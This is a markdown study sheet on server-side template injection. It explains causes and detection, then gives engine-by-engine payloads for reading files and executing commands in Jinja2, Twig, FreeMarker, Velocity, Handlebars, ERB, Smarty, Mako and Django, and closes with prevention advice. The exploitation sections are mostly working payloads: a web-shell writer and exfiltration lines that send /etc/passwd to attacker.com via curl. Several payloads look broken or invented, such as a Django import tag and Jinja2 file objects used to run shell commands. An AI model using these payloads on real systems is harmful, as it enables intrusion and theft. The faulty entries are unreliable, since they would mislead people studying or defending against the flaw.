## Server-side Template Injection (SSTI)

- **What it is**
  - A vulnerability that occurs when user input is embedded directly within a server-side template rather than passed as data
  - Allows attackers to inject template directives that are executed on the server
  - Exploits the template engine's native syntax to achieve various attacks
  - Can lead to information disclosure, file read/write, and remote code execution
  - First documented by PortSwigger Research in 2015
  - Distinct from client-side template injection (which executes in the browser)

- **Impact of server-side template injection**
  - **Remote code execution (RCE)**
    - Full control of the application server
    - Ability to read/write files on the server
    - Lateral movement within internal networks
  - **Information disclosure**
    - Access to sensitive application data
    - Access to environment variables and configuration
    - Enumeration of server files and directories
  - **Authentication bypass**
    - Access to admin functionality
    - Privilege escalation
  - **Sandbox escape**
    - Bypassing security restrictions
    - Accessing underlying system resources

- **How vulnerabilities arise**
  
  - **Dynamic template generation**
    - Concatenating user input directly into template strings
    - Example (vulnerable PHP/Twig code):
      ```php
      $output = $twig->render("Hello " . $_GET['name']);
      ```
    - Example (safe PHP/Twig code):
      ```php
      $output = $twig->render("Hello {name}", array("name" => $_GET['name']));
      ```
  
  - **User-supplied templates**
    - Applications that allow users to create or modify templates
    - CMS systems that provide template customization
    - Email template builders
    - Report generation systems
  
  - **Template selection from user input**
    - Applications selecting templates based on user parameters
    - Example:
      ```php
      $template = $_GET['template'] . '.twig';
      $output = $twig->render($template, $data);
      ```
  
  - **Unsafe rendering of user input**
    - Using template engine render methods on untrusted data
    - Example (Ruby/ERB):
      ```ruby
      ERB.new(user_input).result(binding)
      ```

- **Detecting server-side template injection**
  
  - **Identifying vulnerable contexts**
    
    - **Plaintext context**
      - User input is placed directly within the template content
      - Example:
        ```
        Hello [user input here]
        ```
      - Testing with mathematical operations:
        - `${7*7}` → `Hello 49` (successful evaluation indicates SSTI)
        - `{{7*7}}` → `Hello 49` (alternative syntax)
        - `<%= 7*7 %>` → `Hello 49` (alternative syntax)
    
    - **Code context**
      - User input is placed within a template expression
      - Example:
        ```
        Hello {{user input here}}
        ```
      - Testing with expression breaking:
        - `username}}{{7*7` → `Hello 49` (successful evaluation indicates SSTI)
        - `username}}<tag>` → `Hello <tag>` (HTML injection confirms template breaking)
  
  - **Fuzzing techniques**
    
    - **Template expression fuzzing**
      - Use template syntax common to multiple engines:
        - `${{<%[%'"}}%\`
        - `{{7*7}}`
        - `${7*7}`
        - `<%= 7*7 %>`
        - `#{7*7}`
        - `#{ 7*7 }`
        - `*{7*7}`
        - `@(7*7)`
      - Look for error messages, evaluation results, or unusual behavior
    
    - **Polyglot payloads**
      - `${".".<script>alert(1)</script>}`
      - `${{<%[%'"}}%\.${<%[%'"}}%\`
      - `<%= 7*7 %>{{7*7}}${7*7}`
    
    - **Error-based detection**
      - Inject syntactically invalid expressions to trigger error messages:
        - `{{abcd}}`
        - `${abcd}`
        - `<%= abcd %>`
      - Error messages often reveal the template engine in use

- **Identifying the template engine**
  
  - **Common syntax patterns**
    - Jinja2/Twig: `{{expression}}` and `{% statement %}`
    - FreeMarker: `${expression}` and `<#directive>`
    - Velocity: `$variable` and `#directive`
    - Handlebars: `{{expression}}`
    - ERB: `<%= expression %>` and `<% statement %>`
    - Smarty: `{$variable}` and `{function}`
    - Mako: `${expression}` and `% statement`
    - Django: `{{expression}}` and `{% statement %}`
    - Razor: `@(expression)` and `@statement`
  
  - **Template engine fingerprinting**
    
    - **Mathematical operations**
      - Jinja2/Twig: `{{7*'7'}}` returns `7777777`
      - Twig: `{{7*7}}` returns `49`
      - FreeMarker: `${7*7}` returns `49`
      - Velocity: `#set($x = 7*7)${x}` returns `49`
      - ERB: `<%= 7*7 %>` returns `49`
    
    - **Language-specific syntax**
      - Jinja2: `{{ config }}` or `{{ config.items() }}`
      - Twig: `{{ _self.env }}`
      - FreeMarker: `<#list .data_model?keys as key>${key}</#list>`
      - Velocity: `#set($x = $request.getClass().forName('java.lang.Runtime'))`
      - ERB: `<%= defined?(Rails) %>`
  
  - **Error message analysis**
    - Invalid syntax often produces error messages revealing the engine
    - Example (ERB error):
      ```
      (erb):1:in `<main>': undefined local variable or method 'foobar'
      ```
    - Example (Jinja2 error):
      ```
      jinja2.exceptions.UndefinedError: 'foobar' is undefined
      ```

- **Exploiting SSTI by template engine**
  
  - **Jinja2/Twig (Python/PHP)**
    
    - **Basic exploration**
      - Display all variables: `{{ config.items() }}` (Jinja2)
      - Display all variables: `{{ _context }}` (Twig)
      - Verify environment: `{{ self }}`, `{{ namespace }}`, `{{ _self }}`
    
    - **Reading files**
      - Jinja2: `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}`
      - Twig: `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("cat /etc/passwd") }}`
    
    - **Remote code execution**
      - Jinja2:
        ```
        {{ ''.__class__.__mro__[1].__subclasses__()[40]('./app').read() }}
        
        {{''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilscript.py').read()}}
        
        {% for x in ''.__class__.__mro__[1].__subclasses__() %}
          {% if 'warning' in x.__name__ %}
            {{x()._module.__builtins__['__import__']('os').popen('id').read()}}
          {%endif%}
        {% endfor %}
        ```
      - Twig:
        ```
        {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
        
        {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}
        ```
  
  - **FreeMarker (Java)**
    
    - **Basic exploration**
      - List available objects: `${object?keys}`
      - List data model: `<#list .data_model?keys as key>${key}</#list>`
    
    - **Reading files**
      ```
      <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("cat /etc/passwd")}
      
      ${new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\Z").next()}
      ```
    
    - **Remote code execution**
      ```
      <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
      
      <#assign classloader=object?api.class.protectionDomain.classLoader>
      <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
      <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
      <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
      ${dwf.newInstance(ec,null)("id")}
      ```
  
  - **Velocity (Java)**
    
    - **Basic exploration**
      - Get all references: `#set($str=$request.getClass().forName("java.lang.String"))`
      - Get all context variables: `#foreach($key in $context.keys)#if($key != "out")$key = $context.get($key)#end#end`
    
    - **Reading files**
      ```
      #set($e="e")
      #set($x=$request.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime"))
      #set($x=$x.setAccessible(true))
      #set($rt=$x.invoke(null))
      #set($p=$rt.exec("cat /etc/passwd"))
      #set($read=$p.getInputStream())
      #set($buf=@java.lang.reflect.Array::newInstance($request.getClass().forName("java.lang.Byte").TYPE,1024))
      #set($len=$read.read($buf))
      #set($result=$e.valueOf($buf))
      $result.toString().substring(0,$len)
      ```
    
    - **Remote code execution**
      ```
      #set($x=$request.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime"))
      #set($x=$x.setAccessible(true))
      #set($rt=$x.invoke(null))
      #set($p=$rt.exec("id"))
      ```
  
  - **Handlebars (JavaScript)**
    
    - **Prototype pollution**
      ```
      {{#with "s" as |string|}}
        {{#with "e"}}
          {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.constructor.prototype.toString)}}
            {{this.pop}}
            {{#with string.constructor.prototype}}
              {{#with "constructor"}}
                {{../..#with conslist}}
                  {{this.pop}}
                  {{this.push "return process.mainModule.require('child_process').execSync('id');"}}
                  {{this.pop}}
                  {{#with (string.constructor.constructor this)}}
                    {{this}}
                  {{/with}}
                {{/with}}
              {{/with}}
            {{/with}}
          {{/with}}
        {{/with}}
      {{/with}}
      ```
    
    - **Node.js RCE**
      ```
      {{#with "s" as |string|}}
        {{#with "e"}}
          {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.constructor.prototype.toString)}}
            {{this.pop}}
            {{#with string.constructor.prototype}}
              {{#with "constructor"}}
                {{../..#with conslist}}
                  {{this.pop}}
                  {{this.push "return require('child_process').execSync('cat /etc/passwd');"}}
                  {{this.pop}}
                  {{#with (string.constructor.constructor this)}}
                    {{this}}
                  {{/with}}
                {{/with}}
              {{/with}}
            {{/with}}
          {{/with}}
        {{/with}}
      {{/with}}
      ```
  
  - **ERB (Ruby)**
    
    - **Basic exploration**
      - Check environment: `<%= ENV %>`
      - List file system: `<%= Dir.entries('/') %>`
    
    - **Reading files**
      ```
      <%= File.open('/etc/passwd').read %>
      ```
    
    - **Remote code execution**
      ```
      <%= `id` %>
      <%= system('id') %>
      <%= eval('`id`') %>
      <%= IO.popen('id').readlines() %>
      <%= require 'open3'; Open3.capture2('id') %>
      ```
  
  - **Smarty (PHP)**
    
    - **Basic exploration**
      - Access variables: `{$smarty.version}`, `{$smarty.template}`
      - PHP info: `{php}phpinfo();{/php}` (if allowed)
    
    - **Reading files**
      ```
      {config_load file='/etc/passwd'}
      {include file='/etc/passwd'}
      ```
    
    - **Remote code execution**
      ```
      {php}system('id');{/php}
      {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
      ```
  
  - **Mako (Python)**
    
    - **Basic exploration**
      - Check context: `${dir()}`
      - Check globals: `${globals()}`
      - Check locals: `${locals()}`
    
    - **Reading files**
      ```
      ${open('/etc/passwd').read()}
      ```
    
    - **Remote code execution**
      ```
      ${__import__('os').popen('id').read()}
      <%
        import os
        x=os.popen('id').read()
      %>
      ${x}
      ```
  
  - **Django (Python)**
    
    - **Basic exploration**
      - Debug mode info: `{{ debug }}`
      - Settings: `{{ settings }}`
      - Request: `{{ request }}`
    
    - **Reading files (limited due to sandbox)**
      - With debug mode: 
        ```
        {% debug %}
        ```
      - Template loading:
        ```
        {% include "/etc/passwd" %}
        ```
    
    - **Remote code execution (if debug enabled or sandbox escapes found)**
      ```
      {% load module %}
      {% module_import os as os %}
      {{ os.popen('id').read() }}
      ```

- **Advanced SSTI exploitation techniques**
  
  - **Bypass techniques**
    
    - **Filter bypass using alternate syntax**
      - Alternate delimiters: `[% ... %]`, `<# ... #>`, etc.
      - Alternate expression syntax: `${...}` vs `#{...}` vs `{{...}}`
      - Nested expressions: `{{[''.constructor.constructor('alert(1)')()]}}`
    
    - **Blacklist bypass**
      - Character substitution: `{{con\u0073tructor}}` (Unicode)
      - String concatenation: `{{'co'+'nstructor'}}`
      - Array indexing: `{{''['constructor']}}`
      - Encoding tricks: `{{""["con"+"struct"+"or"]["con"+"struct"+"or"]("return global.pro"+"cess.mainModule.re"+"quire('child_pro'+'cess').execSync('whoami')")()}}`
    
    - **Sandbox escape techniques**
      - Java: `java.lang.Runtime.getRuntime().exec(...)`
      - Python: Finding dangerous classes in `__mro__` and `__subclasses__()`
      - Node.js: Prototype pollution to access restricted objects
    
    - **Context-specific bypasses**
      - Using template-specific features (filters, macros, etc.)
      - Leveraging language-specific quirks
      - Exploiting implementation flaws
  
  - **Information gathering**
    
    - **Environment enumeration**
      - Jinja2: `{{ config }}`, `{{ self.__dict__ }}`
      - Twig: `{{ _self }}`, `{{ _context }}`
      - FreeMarker: `${.data_model}`, `${.globals}`
      - ERB: `<%= ENV %>`, `<%= local_variables %>`
    
    - **Filesystem exploration**
      - Jinja2: `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/').read() }}`
      - ERB: `<%= Dir.entries('/') %>`
      - PHP (Smarty/Twig): Analyzing paths in stacktraces
    
    - **Application reconnaissance**
      - Framework detection
      - Application structure
      - Internal APIs and services
      - Authentication mechanisms
  
  - **Source code disclosure**
    
    - **Template files**
      - Reading template source: `{{ ''.__class__.__mro__[1].__subclasses__()[40]('./app/templates/index.html').read() }}`
    
    - **Configuration files**
      - Reading app config: `{{ ''.__class__.__mro__[1].__subclasses__()[40]('./config.py').read() }}`
      - Environment variables: `{{ config }}`
      - YAML/JSON configs: `{{ ''.__class__.__mro__[1].__subclasses__()[40]('./app/config.yaml').read() }}`
    
    - **Application code**
      - Main app file: `{{ ''.__class__.__mro__[1].__subclasses__()[40]('./app.py').read() }}`
      - Dependencies/libraries: `{{ ''.__class__.__mro__[1].__subclasses__()[40]('./requirements.txt').read() }}`
  
  - **Exfiltration techniques**
    
    - **Out-of-band data exfiltration**
      - DNS queries:
        ```
        {{''.__class__.__mro__[1].__subclasses__()[40]('|curl http://$(cat /etc/passwd | base64).attacker.com').read()}}
        ```
      - HTTP requests:
        ```
        {{''.__class__.__mro__[1].__subclasses__()[40]('|curl -d "$(cat /etc/passwd)" https://attacker.com').read()}}
        ```
    
    - **Database access**
      - Jinja2 (with Flask SQLAlchemy): `{{ config.SQLALCHEMY_DATABASE_URI }}`
      - Direct DB connections (if modules available)
    
    - **Blind exploitation**
      - Time-based techniques: `{{ ''.__class__.__mro__[1].__subclasses__()[40]('|if grep -q secret /etc/passwd; then sleep 5; fi').read() }}`
      - Side-channel extraction
      - Error-based techniques

- **Real-world exploitation scenarios**
  
  - **CMS template editors**
    - Exploiting template customization features
    - Attacking admin-accessible template editing
    - Exploiting theme/plugin editors
  
  - **Email templates**
    - Attacking custom email/notification templates
    - Exploiting user-customizable email content
  
  - **Report generators**
    - Targeting custom report templates
    - Exploiting template-based PDF generators
  
  - **Logging systems**
    - Attacking log viewers that use templates
    - Exploiting log formatting functions
  
  - **User profile customization**
    - Targeting custom user profile templates
    - Exploiting personalization features

- **Prevention and mitigation**
  
  - **Secure development practices**
    
    - **Use logic-less templates**
      - Prefer templates like Mustache that don't allow logic
      - Example (Mustache):
        ```
        Hello {{name}} // Only simple variable substitution, no code execution
        ```
    
    - **Never concatenate user input into templates**
      - Always pass data to templates as parameters
      - Bad: `engine.render("Hello " + userData)`
      - Good: `engine.render("Hello {{name}}", {name: userData})`
    
    - **Validate and sanitize inputs**
      - Whitelisting allowed values rather than blacklisting bad ones
      - Strict input validation before it reaches template processing
      - Type checking for template variables
    
    - **Template sandboxing**
      - Use sandbox mode if available (many engines provide this)
      - Example (Twig):
        ```php
        $twig = new Twig_Environment($loader, [
            'sandbox' => true,
        ]);
        $policy = new Twig_Sandbox_SecurityPolicy(
            [], // Allowed tags
            [], // Allowed filters
            [], // Allowed methods
            [], // Allowed properties
            [] // Allowed functions
        );
        $sandbox = new Twig_Extension_Sandbox($policy);
        $twig->addExtension($sandbox);
        ```
      - Limit access to dangerous methods, properties, and functions
  
  - **Security architecture**
    
    - **Privilege separation**
      - Run template processing with minimal privileges
      - Separate template processing from core application logic
    
    - **Containerization**
      - Execute templates in isolated environments
      - Use Docker containers with restricted permissions
    
    - **Template pre-compilation**
      - Pre-compile templates during build/deployment
      - Avoid dynamic template generation entirely
    
    - **Content Security Policy (CSP)**
      - Implement strict CSP headers to limit damage from XSS
      - Restrict resource loading to trusted sources
  
  - **Monitoring and detection**
    
    - **Security logging**
      - Log template compilation and rendering activities
      - Monitor for suspicious template operations
    
    - **Template integrity checking**
      - Validate templates against known-good versions
      - Use checksums/signatures for critical templates
    
    - **Web application firewalls**
      - Configure rules to detect template injection patterns
      - Block requests containing suspicious template syntax
